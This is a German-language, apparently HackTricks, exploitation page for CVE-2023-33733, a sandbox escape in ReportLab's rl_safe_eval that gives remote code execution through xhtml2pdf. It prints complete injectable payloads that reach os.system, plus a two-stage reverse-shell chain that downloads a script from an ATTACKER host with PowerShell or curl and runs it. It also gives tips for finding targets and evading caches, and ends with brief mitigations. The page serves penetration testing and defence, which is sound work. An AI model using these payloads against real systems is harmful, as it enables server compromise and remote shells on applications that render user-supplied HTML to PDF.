# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

Diese Seite dokumentiert einen praktischen Sandbox-Escape und ein RCE-Primitiv in ReportLab’s rl_safe_eval, das von xhtml2pdf und anderen PDF-Generierungs-Pipelines verwendet wird, wenn user-kontrolliertes HTML in PDFs gerendert wird.

CVE-2023-33733 betrifft ReportLab-Versionen bis einschließlich 3.6.12. In bestimmten Attribut-Kontexten (z. B. color) werden Werte, die in triple brackets [[[ ... ]]] eingeschlossen sind, serverseitig von rl_safe_eval ausgewertet. Durch das Erzeugen einer Nutzlast, die von einem auf der Whitelist stehenden builtin (pow) zu dessen Python-Funktions-globals pivotiert, kann ein Angreifer das os-Modul erreichen und Befehle ausführen.

Wichtige Punkte
- Trigger: injiziere [[[ ... ]]] in ausgewertete Attribute wie <font color="..."> innerhalb von Markup, das von ReportLab/xhtml2pdf geparst wird.
- Sandbox: rl_safe_eval ersetzt gefährliche builtins, aber ausgewertete Funktionen geben weiterhin Zugriff auf __globals__.
- Bypass: konstruiere eine transiente Klasse Word, um rl_safe_eval Namensprüfungen zu umgehen und den String "__globals__" zu erreichen, während blockiertes dunder-Filtering vermieden wird.
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stabilität: Gib nach der Ausführung einen gültigen Wert für das Attribut zurück (für color z. B. 'red').

Wann testen
- Anwendungen, die HTML-zu-PDF-Export anbieten (Profile, Rechnungen, Berichte) und xhtml2pdf/ReportLab in PDF-Metadaten oder HTTP-Response-Kommentaren anzeigen.
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- HTTP-Response für PDF beginnt oft mit einem ReportLab generator comment

Wie der Sandbox-Bypass funktioniert
- rl_safe_eval entfernt oder ersetzt viele builtins (getattr, type, pow, ...) und wendet Namensfilterung an, um Attribute zu verweigern, die mit __ beginnen oder in einer Denylist stehen.
- Allerdings leben sichere Funktionen in einem globals-Dictionary, das über func.__globals__ zugänglich ist.
- Verwende type(type(1)) um die echte eingebaute type-Funktion wiederherzustellen (um ReportLabs Wrapper zu umgehen), definiere dann eine Word-Klasse, die von str abgeleitet ist und verändertes Vergleichsverhalten besitzt, sodass:
- .startswith('__') → immer False (um die startswith('__') Namensprüfung zu umgehen)
- .__eq__ gibt beim ersten Vergleich False zurück (um Denylist-Mitgliedschaftsprüfungen zu umgehen) und danach True (damit Python getattr funktioniert)
- .__hash__ entspricht hash(str(self))
- Damit gibt getattr(pow, Word('__globals__')) das globals-Dict der eingewickelten pow-Funktion zurück, das ein importiertes os-Modul enthält. Dann: ['os'].system('<cmd>').

Minimales Exploit-Muster (Attribut-Beispiel)
Plaziere die Nutzlast in einem ausgewerteten Attribut und stelle sicher, dass sie über boolean und 'red' einen gültigen Attributwert zurückgibt.

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- Die List-Comprehension-Form erlaubt einen einzelnen Ausdruck, der von rl_safe_eval akzeptiert wird.
- Das nachgestellte and 'red' gibt eine gültige CSS-Farbe zurück, sodass das Rendering nicht fehlschlägt.
- Ersetze den Befehl nach Bedarf; verwende ping zur Validierung der Ausführung mit tcpdump.

Operationaler Ablauf
1) PDF-Generator identifizieren
- PDF Producer zeigt xhtml2pdf; HTTP-Response enthält ReportLab comment.
2) Finde eine Eingabe, die ins PDF reflektiert wird (z. B. Profil-Bio/-Beschreibung) und löse einen Export aus.
3) Verifiziere Ausführung mit low-noise ICMP
- Ausführen: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows sendet standardmäßig häufig genau vier Echo-Anfragen.
4) Shell etablieren
- Für Windows verhindert ein zuverlässiger Two-Stage-Ansatz Quoting-/Encoding-Probleme:
- Stage 1 (download):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (ausführen):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Für Linux-Ziele ist ein ähnlicher Two-Stage-Ansatz mit curl/wget möglich:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

Hinweise und Tipps
- Attribut-Kontexte: color ist ein bekanntes ausgewertetes Attribut; andere Attribute im ReportLab-Markup können ebenfalls Ausdrücke auswerten. Wenn eine Stelle bereinigt ist, probiere andere, die in den PDF-Flow gerendert werden (verschiedene Felder, Tabellenstile, etc.).
- Quoting: Halte Befehle kompakt. Two-Stage-Downloads reduzieren drastisch Quoting- und Escape-Probleme.
- Zuverlässigkeit: Wenn Exporte gecached oder in eine Warteschlange gestellt werden, variiere die Nutzlast leicht (z. B. zufälliger Pfad oder Query), um Cache-Treffer zu vermeiden.

Mitigierungen und Erkennung
- Upgrade ReportLab auf 3.6.13 oder neuer (CVE-2023-33733 gefixt). Verfolge auch Sicherheitshinweise in Distro-Paketen.
- Füttere xhtml2pdf/ReportLab nicht direkt mit user-kontrolliertem HTML/Markup ohne strikte Sanitization. Entferne/verweigere [[[...]]] Auswertungs-Konstrukte und vendor-spezifische Tags, wenn die Eingabe untrusted ist.
- Erwäge, rl_safe_eval für untrusted Inputs vollständig zu deaktivieren oder zu umhüllen.
- Überwache auf verdächtige ausgehende Verbindungen während der PDF-Generierung (z. B. ICMP/HTTP von App-Servern beim Export von Dokumenten).

Referenzen
- PoC und technische Analyse: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (Real-World Exploitation, Windows Two-Stage Payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD-Eintrag (betroffene Versionen): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (Markup/Page-Konzepte): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
